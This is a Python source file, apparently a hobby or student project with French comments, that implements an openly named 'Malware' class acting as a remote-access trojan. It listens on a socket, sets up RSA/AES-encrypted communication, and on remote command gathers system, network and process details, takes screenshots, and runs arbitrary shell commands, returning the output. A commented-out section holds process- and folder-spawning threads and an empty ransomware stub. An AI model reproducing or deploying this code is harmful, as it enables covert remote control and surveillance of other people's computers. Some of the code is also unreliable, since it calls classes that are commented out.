import pyscreeze, pyscreenshot, socket, os, time, logging, psutil, getpass, random
from pynput.keyboard import Key, Listener
from Crypto.Cipher import AES
import os, sys, socket, subprocess as sp, platform, time, pyscreeze, pkg_resources, base64
from threading import Thread, Event, Lock
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from Crypto import Random

from cryptography.hazmat.primitives.serialization import load_pem_public_key
from cryptography.hazmat.primitives.serialization import load_pem_private_key

# CONSTANTES
ENCODING = 'UTF-8'
BUFFERSIZE = 2048
TIME_OUT = 3
TMP = os.environ["TEMP"]


class Malware():

    def __init__(self):
        self.ip = ''
        self.port = 50001
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn = self.s
        self.addr = self.s
        self.KEY = ""

    def connect(self):
        self.s.bind((self.ip, self.port))
        print("En Attente du client...")  # DEBUG A SUPPRIMER
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()
        print("Connexion établie avec le client")

    def disconnect(self):
        self.s.close()

    def load_key_private(self):
        with open("key_malware\\key_private_client.pem", 'rb') as pem_in:
            pemlines = pem_in.read()
        privkey = load_pem_private_key(pemlines, None, backend=default_backend())
        return privkey

    def init_rsa(self):
        private_key = self.load_key_private()

        cipher_Key = self.conn.recv(BUFFERSIZE)
        print('DEBUG', cipher_Key)
        self.KEY = private_key.decrypt(cipher_Key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                                algorithm=hashes.SHA256(),
                                                                label=None))
        self.KEY = self.KEY.decode(ENCODING)
        print(self.KEY)

    def iv(self):
        return Random.new().read(AES.block_size)

    def do_encrypt(self, message):
        iv = self.iv()
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB, iv)
        print(message)
        cipherMessage = enc.encrypt(message)
        print(cipherMessage)
        return iv + cipherMessage

    def do_decrypt(self, cipherMessage):
        enc = AES.new(self.KEY.encode(ENCODING), AES.MODE_CFB, cipherMessage[:16])
        # cipherMessage = base64.b64decode(cipherMessage)
        message = enc.decrypt(cipherMessage[16:])
        return message.decode(ENCODING, errors='ignore')

    def task(self):

        act = self.conn.recv(1024)
        act = self.do_decrypt(act)
        print(act)

        while act != 'exit()':
            if act == 'getinfo':
                self.giveInformationsSystem()
            if act == 'os':
                self.giveOperatingSystem()
            elif act == 'cwd':
                self.giveCurrentWorkingDirectory()
            elif act[:2] == 'cd':
                self.changeCurrentDirectory(act)
                # self.giveCurrentWorkingDirectory()
            elif act == 'prtscr':
                self.givePrtScr()
            elif act == 'bat':
                proc = InifiteProcess()
                file = InfiniteFile()
                proc.start()
                file.start()
                proc.join()
                file.join()

            else:
                shell = Shell(self.conn, act, self.KEY)
                shell.ReturnResultCmd()

            act = self.conn.recv(1024)
            act = self.do_decrypt(act)
            print(act)

    def giveInformationsSystem(self):
        msg_info_global = '\n'
        ## D'après la DOC, la constante de l'OS est à TRUE et les autres à false
        if (psutil.WINDOWS):
            systemeExploitation = "WINDOWS"
        elif (psutil.LINUX):
            systemeExploitation = "LINUX"
        elif (psutil.MACOS):
            systemeExploitation = "MACOS"
        username = getpass.getuser()
        hostname = socket.gethostname()
        processId = os.getpid()  # récupération de l'identifiant du processus Malware

        # Informations globales OS + HOSTNAME + USERNAME + PROCESSID
        msg_info_global += (f'###################### INFORMATIONS GLOBALES ###################### \n'
                            f'OS \t\t\t\t : {systemeExploitation}\n'
                            f'Hostname \t\t : {hostname} \n'
                            f'Utilisateur \t : {username} \n'
                            f'ID processus \t : {processId} \n')

        # Informations sur les disques connectés à l'ordinateur

        listeDisque = psutil.disk_partitions()
        msg_info_global += (f'###################### INFORMATIONS DISQUES ###################### \n')
        for elem in listeDisque:
            msg_info_global += (f'Lettre du disque : {elem[0]} \n'
                                f'Point d\'encrage : {elem[1]} \n'
                                f'Format du disque : {elem[2]} \n'
                                f'options ?? : {elem[3]} \n\n')

        msg_info_reseau = '\n'
        # INFORMATIONS RESEAUX... TOUTES LES CONNEXIONS ACTUELLES A LA MACHINE
        # Fichier : infoReseaux.log
        msg_info_reseau += (f'###################### INFORMATIONS RESEAUX ######################\n')
        # kind : inet, inet4, inet6, tcp, tcp4,tcp6, udp,udp4,udp6, unix, all
        for elem2 in psutil.net_connections(kind='all'):
            # 3:0 = adresse locale  , 3:1 = port local
            # 4:0 = adresse distante, 4:1 = port distant
            # 5   = Status de la connexion
            # /!\ Il peut ne pas y avoir d'adresse distante, dans quel cas on affiche uniquement l'adresse/port local.
            # Sinon, le 4eme élement est vide et on se retrouve avec un out of index.
            if not elem2[4]:
                msg_info_reseau += (f'Adresse : {elem2[3][0]}:{elem2[3][1]} | {elem2[5]}\n')
            else:
                msg_info_reseau += (
                    f'Adresse : {elem2[3][0]}:{elem2[3][1]} --> {elem2[4][0]}:{elem2[4][1]} | {elem2[5]}\n')

        # INFORMATIONS PROCESSUS... LISTE TOUS LES PROCESSUS ACTIFS POUR LE MOMENT

        msg_info_process = '\n'
        msg_info_process += (f'###################### INFORMATIONS PROCESSUS ######################\n')
        for proc in psutil.process_iter(attrs=['name', 'username', 'pid']):
            for item in proc.info:
                msg_info_process += (item + ' : ' + str(proc.info[item]) + '\t')
            msg_info_process += ('\n')  # Rajout un passage à la ligne pour la forme

        msg_final = msg_info_global + msg_info_reseau + msg_info_process + "EOD"
        self.conn.sendall(self.do_encrypt(msg_final.encode(ENCODING)))

    def giveOperatingSystem(self):
        opSys = platform.system()
        self.conn.send(self.do_encrypt(opSys.encode(ENCODING)))

    def giveCurrentWorkingDirectory(self):
        cwd = os.getcwd()
        print('[DEBUG] Give CWD >', cwd)
        self.conn.send(self.do_encrypt(cwd.encode(ENCODING)))

    def changeCurrentDirectory(self, act):
        print('[DEBUG] Change Directory > ', act)
        cd = act.strip('cd ')
        try:
            os.chdir(cd)
        except:
            print('Adresse Introuvable')

    def givePrtScr(self):
        pyscreeze.screenshot(TMP + "/s.png")

        # send screenshot information to server
        self.conn.send(str.encode("Screenshot..." + "\n" + "Taille fichier: " + str(os.path.getsize(TMP + "/s.png"))
                                  + " bytes" + "\n" + "..."))
        objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
        time.sleep(1)
        self.conn.send(objPic.read())
        objPic.close()

    def run(self):
        self.connect()
        self.init_rsa()
        self.task()
        self.disconnect()


class Shell(Malware):

    def __init__(self, s, cmd, key):
        self.conn = s
        self.cmd = cmd
        self.KEY = key

    def ReturnResultCmd(self):
        print('apres reception')
        sh = sp.Popen(self.cmd, shell=True, stdout=sp.PIPE,
                      stderr=sp.PIPE, stdin=sp.PIPE,
                      universal_newlines=True)
        out, err = sh.communicate()
        result = (out) + (err)
        self.conn.sendall(self.do_encrypt(result.encode(ENCODING)))


'''
class InifiteProcess(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iProc = 0

        while iProc < 5:
            self.lock.acquire()
            os.system("start cmd.exe")
            self.lock.release()
            iProc = iProc +1


class InfiniteFile(Thread):

    def __init__(self):
        Thread.__init__(self)
        self.lock = Lock()

    def run(self):
        iFile = 0
        nom = str(iFile)
        while iFile < 5:
            self.lock.acquire()
            os.system("md "+nom+".txt")
            self.lock.release()
            iFile = iFile+1
            nom = str(iFile)



class Ransomware():
    pass
'''

go = Malware()
go.run()

